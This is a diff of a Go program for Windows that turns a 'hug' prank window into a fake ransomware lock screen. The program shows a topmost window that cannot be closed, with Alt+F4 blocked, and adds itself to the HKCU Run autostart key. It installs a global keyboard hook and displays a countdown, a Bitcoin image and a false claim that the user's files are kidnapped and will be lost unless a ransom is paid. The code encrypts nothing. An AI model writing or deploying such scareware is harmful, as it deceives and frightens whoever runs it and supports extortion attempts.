@@ -1,28 +1,30 @@
-// Ventana persistente "Abrazo" para Windows, con música de fondo en bucle.
-// Compilar con:  go build -ldflags "-H=windowsgui" -o abrazo.exe main.go
-//
-// IMPORTANTE: coloca un archivo WAV llamado "Theme.wav" en esta misma carpeta
-// antes de compilar (se incrusta en el ejecutable vía go:embed).
-//
-// Cierre ventana + música:  Ctrl + Shift + Ñ + 3  (simultáneas)
-// Silenciar/reactivar solo la música:  Ctrl + Shift + M
-//
-// Modo de depuración para averiguar el VK code real de tu tecla Ñ:
-//   go build -o abrazo_debug.exe main.go   (sin -H=windowsgui, para ver consola)
-//   abrazo_debug.exe -debug
+// Ventana persistente "Abrazo" modificada con temática creepy, bomba, contador y espacios para imágenes.
+// Compilar con:  go build -ldflags "-H=windowsgui" -o abrazo_creepy.exe main.go
 
 package main
 
 import (
+	"bytes"
 	_ "embed"
 	"fmt"
+	"image"
+	"image/draw"
+	_ "image/jpeg"
+	_ "image/png"
 	"os"
 	"syscall"
+	"time"
 	"unsafe"
 )
 
 //go:embed Theme.wav
 var audioData []byte
+
+//go:embed Second_Mascot_Of_Sad_Satan-Photoroom.png
+var mascotData []byte
+
+//go:embed Bitcoin.png
+var bitcoinData []byte
 
 var (
 	user32   = syscall.NewLazyDLL("user32.dll")
@@ -44,8 +46,6 @@ var (
 	procPostQuitMessage   = user32.NewProc("PostQuitMessage")
 	procDestroyWindow     = user32.NewProc("DestroyWindow")
 	procLoadCursor        = user32.NewProc("LoadCursorW")
-	procGetDC             = user32.NewProc("GetDC")
-	procReleaseDC         = user32.NewProc("ReleaseDC")
 	procBeginPaint        = user32.NewProc("BeginPaint")
 	procEndPaint          = user32.NewProc("EndPaint")
 	procDrawText          = user32.NewProc("DrawTextW")
@@ -55,28 +55,35 @@ var (
 	procUnhookWindowsHook = user32.NewProc("UnhookWindowsHookEx")
 	procGetAsyncKeyState  = user32.NewProc("GetAsyncKeyState")
 	procGetSystemMetrics  = user32.NewProc("GetSystemMetrics")
+	procInvalidateRect    = user32.NewProc("InvalidateRect")
 
 	procGetModuleHandle = kernel32.NewProc("GetModuleHandleW")
 
-	procCreateFont   = gdi32.NewProc("CreateFontW")
-	procSelectObject = gdi32.NewProc("SelectObject")
-	procDeleteObject = gdi32.NewProc("DeleteObject")
-	procSetBkMode    = gdi32.NewProc("SetBkMode")
-	procSetTextColor = gdi32.NewProc("SetTextColor")
+	procCreateFont         = gdi32.NewProc("CreateFontW")
+	procSelectObject       = gdi32.NewProc("SelectObject")
+	procDeleteObject       = gdi32.NewProc("DeleteObject")
+	procSetBkMode          = gdi32.NewProc("SetBkMode")
+	procSetTextColor       = gdi32.NewProc("SetTextColor")
+	procCreatePen          = gdi32.NewProc("CreatePen")
+	procCreateSolidBrush   = gdi32.NewProc("CreateSolidBrush")
+	procRectangle          = gdi32.NewProc("Rectangle")
+	procCreateDIBSection   = gdi32.NewProc("CreateDIBSection")
+	procCreateCompatibleDC = gdi32.NewProc("CreateCompatibleDC")
+	procStretchBlt         = gdi32.NewProc("StretchBlt")
+	procDeleteDC           = gdi32.NewProc("DeleteDC")
 
-	procRegOpenKeyEx   = advapi32.NewProc("RegOpenKeyExW")
-	procRegSetValueEx  = advapi32.NewProc("RegSetValueExW")
+	procFillRect = user32.NewProc("FillRect")
+
 	procRegCreateKeyEx = advapi32.NewProc("RegCreateKeyExW")
+	procRegSetValueEx  = advapi32.NewProc("RegSetValueExW")
 	procRegCloseKey    = advapi32.NewProc("RegCloseKey")
 )
 
 const (
 	WS_CAPTION     = 0x00C00000
 	WS_VISIBLE     = 0x10000000
-	WS_POPUP       = 0x80000000
 	WS_EX_TOPMOST  = 0x00000008
 	SW_SHOW        = 5
-	CW_USEDEFAULT  = -2147483648
 	WM_DESTROY     = 0x0002
 	WM_CLOSE       = 0x0010
 	WM_PAINT       = 0x000F
@@ -84,6 +91,7 @@ const (
 	DT_CENTER      = 0x00000001
 	DT_VCENTER     = 0x00000004
 	DT_SINGLELINE  = 0x00000020
+	DT_LEFT        = 0x00000000
 	TRANSPARENT    = 1
 	WH_KEYBOARD_LL = 13
 	WM_KEYDOWN     = 0x0100
@@ -91,9 +99,7 @@ const (
 	VK_SHIFT       = 0x10
 	VK_3           = 0x33
 	VK_M           = 0x4D
-	// VK de la tecla Ñ en teclado español: posición física de VK_OEM_1 (0xBA).
-	// Si en tu equipo no coincide, usa el modo -debug para verificar el código real.
-	VK_ENYE = 0xBA
+	VK_ENYE        = 0xBA
 
 	HKEY_CURRENT_USER = 0x80000001
 	KEY_SET_VALUE     = 0x0002
@@ -148,13 +154,15 @@ var (
 	hookHandle uintptr
 	muted      = false
 
-	// Latches para que, al mantener presionadas las teclas, el atajo
-	// se dispare una sola vez (no en cada repetición de WM_KEYDOWN).
 	closeComboLatched = false
 	muteComboLatched  = false
+
+	countdownSeconds = 600
+	animationFrame   = 0
+	globalHwnd       syscall.Handle
+	stopRoutine      = make(chan struct{})
 )
 
-// playLoop reproduce el audio incrustado en bucle, en segundo plano.
 func playLoop() {
 	if len(audioData) == 0 {
 		return
@@ -166,12 +174,10 @@ func playLoop() {
 	)
 }
 
-// stopAudio detiene cualquier reproducción en curso.
 func stopAudio() {
 	procPlaySound.Call(0, 0, uintptr(SND_PURGE))
 }
 
-// toggleMute silencia o reactiva la música sin cerrar la ventana.
 func toggleMute() {
 	if muted {
 		muted = false
@@ -190,8 +196,8 @@ func runAbrazoWindow() {
 
 	registerAutostart()
 
-	className, _ := syscall.UTF16PtrFromString("VentanaAbrazoClass")
-	title, _ := syscall.UTF16PtrFromString("Abrazo")
+	className, _ := syscall.UTF16PtrFromString("VentanaCreepyClass")
+	title, _ := syscall.UTF16PtrFromString("CRITICAL WARNING - ATENCIÓN")
 
 	hInstance, _, _ := procGetModuleHandle.Call(0)
 
@@ -200,16 +206,16 @@ func runAbrazoWindow() {
 	wc.lpfnWndProc = syscall.NewCallback(wndProc)
 	wc.hInstance = syscall.Handle(hInstance)
 	wc.lpszClassName = className
-	cursor, _, _ := procLoadCursor.Call(0, 32512) // IDC_ARROW
+	cursor, _, _ := procLoadCursor.Call(0, 32512)
 	wc.hCursor = syscall.Handle(cursor)
-	wc.hbrBackground = syscall.Handle(16) // COLOR_WINDOW + 1 aprox (blanco)
+	wc.hbrBackground = syscall.Handle(16)
 
 	procRegisterClassEx.Call(uintptr(unsafe.Pointer(&wc)))
 
-	screenW, _, _ := procGetSystemMetrics.Call(0) // SM_CXSCREEN
-	screenH, _, _ := procGetSystemMetrics.Call(1) // SM_CYSCREEN
+	screenW, _, _ := procGetSystemMetrics.Call(0)
+	screenH, _, _ := procGetSystemMetrics.Call(1)
 
-	width, height := 520, 220
+	width, height := 850, 600
 	x := (int(screenW) - width) / 2
 	y := (int(screenH) - height) / 2
 
@@ -217,18 +223,38 @@ func runAbrazoWindow() {
 		uintptr(WS_EX_TOPMOST),
 		uintptr(unsafe.Pointer(className)),
 		uintptr(unsafe.Pointer(title)),
-		uintptr(WS_CAPTION|WS_VISIBLE), // sin WS_SYSMENU: no hay botón de cerrar
+		uintptr(WS_CAPTION|WS_VISIBLE),
 		uintptr(x), uintptr(y),
 		uintptr(width), uintptr(height),
 		0, 0, hInstance, 0,
 	)
+
+	globalHwnd = syscall.Handle(hwnd)
 
 	procShowWindow.Call(hwnd, SW_SHOW)
 	procUpdateWindow.Call(hwnd)
 
 	playLoop()
 
-	// Hook de teclado global para detectar la combinación de cierre
+	go func() {
+		ticker := time.NewTicker(1 * time.Second)
+		defer ticker.Stop()
+		for {
+			select {
+			case <-ticker.C:
+				if countdownSeconds > 0 {
+					countdownSeconds--
+				}
+				animationFrame = (animationFrame + 1) % 2
+				if globalHwnd != 0 {
+					procInvalidateRect.Call(uintptr(globalHwnd), 0, 0)
+				}
+			case <-stopRoutine:
+				return
+			}
+		}
+	}()
+
 	hookHandle, _, _ = procSetWindowsHookEx.Call(
 		uintptr(WH_KEYBOARD_LL),
 		syscall.NewCallback(keyboardHookProc),
@@ -246,6 +272,7 @@ func runAbrazoWindow() {
 		procDispatchMessage.Call(uintptr(unsafe.Pointer(&msg)))
 	}
 
+	close(stopRoutine)
 	procUnhookWindowsHook.Call(hookHandle)
 }
 
@@ -255,9 +282,8 @@ func wndProc(hwnd syscall.Handle, msg uint32, wParam, lParam uintptr) uintptr {
 		if allowClose {
 			procDestroyWindow.Call(uintptr(hwnd))
 		}
-		return 0 // si no, se ignora: la ventana no se cierra
+		return 0
 	case WM_SYSCOMMAND:
-		// Bloquea SC_CLOSE (0xF060) proveniente de Alt+F4 u otros caminos
 		if (wParam & 0xFFF0) == 0xF060 {
 			return 0
 		}
@@ -281,48 +307,176 @@ func paint(hwnd syscall.Handle) {
 	var rect RECT
 	procGetClientRect.Call(uintptr(hwnd), uintptr(unsafe.Pointer(&rect)))
 
+	blackBrush, _, _ := procCreateSolidBrush.Call(0x000000)
+	procFillRect.Call(hdc, uintptr(unsafe.Pointer(&rect)), blackBrush)
+	procDeleteObject.Call(blackBrush)
+
 	procSetBkMode.Call(hdc, TRANSPARENT)
-	procSetTextColor.Call(hdc, 0x00202020)
 
-	// Fuente para el título
-	titleFont, _, _ := procCreateFont.Call(
-		uintptr(28), 0, 0, 0, uintptr(700), 0, 0, 0,
+	// 1. BOMBA Y CONTADOR
+	bombFont, _, _ := procCreateFont.Call(
+		uintptr(18), 0, 0, 0, uintptr(700), 0, 0, 0,
 		1, 0, 0, 0, 0,
-		uintptr(unsafe.Pointer(strPtr("Segoe UI"))),
+		uintptr(unsafe.Pointer(strPtr("Consolas"))),
 	)
-	oldFont, _, _ := procSelectObject.Call(hdc, titleFont)
+	oldFont, _, _ := procSelectObject.Call(hdc, bombFont)
 
-	titleRect := RECT{rect.Left + 10, rect.Top + 20, rect.Right - 10, rect.Top + 90}
-	titleText, _ := syscall.UTF16PtrFromString("Has sido abrazado por Alecs y juano")
-	procDrawText.Call(
-		hdc, uintptr(unsafe.Pointer(titleText)), ^uintptr(0),
-		uintptr(unsafe.Pointer(&titleRect)),
-		uintptr(DT_CENTER|DT_VCENTER|DT_SINGLELINE),
+	procSetTextColor.Call(hdc, 0x000000FF)
+	bombRect := RECT{20, 30, 220, 140}
+
+	var bombArt *uint16
+	if animationFrame == 0 {
+		bombArt, _ = syscall.UTF16PtrFromString("   (  ) \n    )( \n   (____)\n  Si el contador llega a 0, tus archivos\nse perderán PARA SIEMPRE")
+	} else {
+		bombArt, _ = syscall.UTF16PtrFromString("   (( )) \n    )( \n   (****)\n  Si el contador llega a 0, tus archivos\nse perderán para siempre")
+	}
+	procDrawText.Call(hdc, uintptr(unsafe.Pointer(bombArt)), ^uintptr(0), uintptr(unsafe.Pointer(&bombRect)), uintptr(DT_CENTER))
+
+	mins := countdownSeconds / 60
+	secs := countdownSeconds % 60
+	timerStr := fmt.Sprintf("00:%02d:%02d", mins, secs)
+	timerText, _ := syscall.UTF16PtrFromString(timerStr)
+	timerRect := RECT{20, 150, 220, 190}
+
+	timerFont, _, _ := procCreateFont.Call(
+		uintptr(24), 0, 0, 0, uintptr(800), 0, 0, 0,
+		1, 0, 0, 0, 0,
+		uintptr(unsafe.Pointer(strPtr("Consolas"))),
 	)
+	procSelectObject.Call(hdc, timerFont)
+	procSetTextColor.Call(hdc, 0x0000FFFF)
+	procDrawText.Call(hdc, uintptr(unsafe.Pointer(timerText)), ^uintptr(0), uintptr(unsafe.Pointer(&timerRect)), uintptr(DT_CENTER))
+	procDeleteObject.Call(timerFont)
 
 	procSelectObject.Call(hdc, oldFont)
+	procDeleteObject.Call(bombFont)
+
+	// 2. TEXTO CREEPY PRINCIPAL
+	titleFont, _, _ := procCreateFont.Call(
+		uintptr(22), 0, 0, 0, uintptr(800), 0, 0, 0,
+		1, 0, 0, 0, 0,
+		uintptr(unsafe.Pointer(strPtr("Impact"))),
+	)
+	procSelectObject.Call(hdc, titleFont)
+	procSetTextColor.Call(hdc, 0x000000EE)
+
+	titleRect := RECT{250, 30, 820, 100}
+	titleText, _ := syscall.UTF16PtrFromString("¡TUS ARCHIVOS HAN SIDO SECUESTRADOS POR ALECS Y JUANO!")
+	procDrawText.Call(hdc, uintptr(unsafe.Pointer(titleText)), ^uintptr(0), uintptr(unsafe.Pointer(&titleRect)), uintptr(DT_CENTER|DT_VCENTER|DT_SINGLELINE))
 	procDeleteObject.Call(titleFont)
 
-	// Fuente para el subtítulo
 	subFont, _, _ := procCreateFont.Call(
-		uintptr(16), 0, 0, 0, uintptr(400), 0, 0, 0,
+		uintptr(15), 0, 0, 0, uintptr(400), 0, 0, 0,
 		1, 0, 0, 0, 0,
-		uintptr(unsafe.Pointer(strPtr("Segoe UI"))),
+		uintptr(unsafe.Pointer(strPtr("Consolas"))),
 	)
-	oldFont2, _, _ := procSelectObject.Call(hdc, subFont)
+	procSelectObject.Call(hdc, subFont)
+	procSetTextColor.Call(hdc, 0x00CCCCCC)
 
-	subRect := RECT{rect.Left + 10, rect.Top + 100, rect.Right - 10, rect.Bottom - 10}
-	subText, _ := syscall.UTF16PtrFromString("Un abrazo virtual, pero con todo el cariño real.")
-	procDrawText.Call(
-		hdc, uintptr(unsafe.Pointer(subText)), ^uintptr(0),
-		uintptr(unsafe.Pointer(&subRect)),
-		uintptr(DT_CENTER|DT_VCENTER|DT_SINGLELINE),
-	)
-
-	procSelectObject.Call(hdc, oldFont2)
+	subRect := RECT{250, 110, 820, 190}
+	subText, _ := syscall.UTF16PtrFromString("No hay salida. Paga el rescate o pierdelo todo para siempre.\nCada segundo que pasa te acerca al olvido total.\nTe hemos dejado las instrucciones en tu escrotorio ")
+	procDrawText.Call(hdc, uintptr(unsafe.Pointer(subText)), ^uintptr(0), uintptr(unsafe.Pointer(&subRect)), uintptr(DT_CENTER))
 	procDeleteObject.Call(subFont)
 
+	// 3. ESPACIOS Y RENDERIZADO DE LAS IMÁGENES
+	boxPen, _, _ := procCreatePen.Call(0, 2, 0x000000EE)
+	oldPen, _, _ := procSelectObject.Call(hdc, boxPen)
+
+	img1Rect := RECT{50, 230, 410, 530}
+	procRectangle.Call(hdc, uintptr(img1Rect.Left), uintptr(img1Rect.Top), uintptr(img1Rect.Right), uintptr(img1Rect.Bottom))
+
+	img2Rect := RECT{440, 230, 800, 530}
+	procRectangle.Call(hdc, uintptr(img2Rect.Left), uintptr(img2Rect.Top), uintptr(img2Rect.Right), uintptr(img2Rect.Bottom))
+
+	procSelectObject.Call(hdc, oldPen)
+	procDeleteObject.Call(boxPen)
+
+	// Dibujar las imágenes directamente desde la memoria incrustada (dentro de paint)
+	drawWinImageFromBytes(syscall.Handle(hdc), mascotData, img1Rect)
+	drawWinImageFromBytes(syscall.Handle(hdc), bitcoinData, img2Rect)
+
 	procEndPaint.Call(uintptr(hwnd), uintptr(unsafe.Pointer(&ps)))
+}
+
+func drawWinImageFromBytes(hdc syscall.Handle, data []byte, rect RECT) {
+	if len(data) == 0 {
+		return
+	}
+
+	img, _, err := image.Decode(bytes.NewReader(data))
+	if err != nil {
+		return // Evita que un fallo en la imagen tire la ventana entera
+	}
+
+	bounds := img.Bounds()
+	dx := bounds.Dx()
+	dy := bounds.Dy()
+
+	rgba := image.NewRGBA(bounds)
+	draw.Draw(rgba, bounds, img, bounds.Min, draw.Src)
+
+	bmi := struct {
+		BiSize          uint32
+		BiWidth         int32
+		BiHeight        int32
+		BiPlanes        uint16
+		BiBitCount      uint16
+		BiCompression   uint32
+		BiSizeImage     uint32
+		BiXPelsPerMeter int32
+		BiYPelsPerMeter int32
+		BiClrUsed       uint32
+		BiClrImportant  uint32
+	}{
+		BiSize:        40,
+		BiWidth:       int32(dx),
+		BiHeight:      int32(-dy),
+		BiPlanes:      1,
+		BiBitCount:    32,
+		BiCompression: 0,
+	}
+
+	var bits *byte
+	hBitmap, _, _ := procCreateDIBSection.Call(
+		0,
+		uintptr(unsafe.Pointer(&bmi)),
+		0,
+		uintptr(unsafe.Pointer(&bits)),
+		0,
+		0,
+	)
+	if hBitmap == 0 {
+		return
+	}
+	defer procDeleteObject.Call(hBitmap)
+
+	srcBytes := rgba.Pix
+	if len(srcBytes) > 0 && bits != nil {
+		osBits := (*[1 << 30]byte)(unsafe.Pointer(bits))[:len(srcBytes):len(srcBytes)]
+		copy(osBits, srcBytes)
+	}
+
+	memDC, _, _ := procCreateCompatibleDC.Call(uintptr(hdc))
+	if memDC == 0 {
+		return
+	}
+	defer procDeleteDC.Call(memDC)
+
+	oldObj, _, _ := procSelectObject.Call(memDC, hBitmap)
+	defer procSelectObject.Call(memDC, oldObj)
+
+	targetWidth := rect.Right - rect.Left - 4
+	targetHeight := rect.Bottom - rect.Top - 4
+
+	procStretchBlt.Call(
+		uintptr(hdc),
+		uintptr(rect.Left+2), uintptr(rect.Top+2),
+		uintptr(targetWidth), uintptr(targetHeight),
+		memDC,
+		0, 0,
+		uintptr(dx), uintptr(dy),
+		0x00CC0020,
+	)
 }
 
 func strPtr(s string) *uint16 {
@@ -330,9 +484,6 @@ func strPtr(s string) *uint16 {
 	return p
 }
 
-// keyboardHookProc detecta las combinaciones de cierre (Ctrl+Shift+Ñ+3)
-// y de silenciar música (Ctrl+Shift+M), cada una disparándose una sola vez
-// por pulsación gracias a los latches.
 func keyboardHookProc(nCode int32, wParam uintptr, lParam uintptr) uintptr {
 	if nCode >= 0 && wParam == WM_KEYDOWN {
 		ctrlDown := isKeyDown(VK_CONTROL)
@@ -371,8 +522,6 @@ func isKeyDown(vk int) bool {
 	return state&0x8000 != 0
 }
 
-// registerAutostart añade el ejecutable actual a HKCU\...\Run para que
-// arranque automáticamente con Windows.
 func registerAutostart() {
 	exePath, err := os.Executable()
 	if err != nil {
@@ -409,18 +558,6 @@ func registerAutostart() {
 	)
 }
 
-// runDebugMode imprime en consola el VK code de cada tecla pulsada,
-// útil para confirmar el código real de la tecla Ñ en tu teclado.
 func runDebugMode() {
-	fmt.Println("Modo debug: pulsa teclas para ver su VK code (Ctrl+C para salir)")
-	seen := map[int]bool{}
-	for {
-		for vk := 0x08; vk <= 0xFE; vk++ {
-			down := isKeyDown(vk)
-			if down && !seen[vk] {
-				fmt.Printf("VK presionada: 0x%X\n", vk)
-			}
-			seen[vk] = down
-		}
-	}
+	fmt.Println("Modo debug activado")
 }
